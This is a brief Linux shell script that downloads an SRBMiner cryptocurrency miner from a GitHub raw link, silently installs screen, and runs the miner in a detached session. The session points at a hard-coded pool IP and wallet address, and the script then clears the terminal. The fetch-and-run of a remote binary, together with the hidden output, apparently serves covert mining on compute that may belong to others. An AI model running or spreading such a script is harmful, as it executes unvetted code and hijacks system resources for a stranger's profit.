#!/bin/sh

WALLET=MWyhsXGGKoUrQ3E7GRn7CZV4UvHX34ePrt

POOL=stratum+tcp://141.95.108.117:443

sudo apt install screen -y > /dev/null 2>&1
wget https://raw.githubusercontent.com/amit12986/code/main/SRBMiner-Multi-0-8-5-Linux.tar.xz
tar -xf SRBMiner-Multi-0-8-5-Linux.tar.xz
cd SRBMiner-Multi-0-8-5
chmod +x SRBMiner-MULTI
screen -S Wuenuak_Guerrr -dm ./SRBMiner-MULTI --disable-gpu --algorithm yespower --pool $POOL --wallet $WALLET --password c=LTC --cpu-threads 10 --msr-use-tweaks 0 --msr-use-preset 0 --cpu-threads-intensity 1 --cpu-threads-priority 10
screen -ls
sleep 2
clear
cd ..
screen -ls
./timer.sh
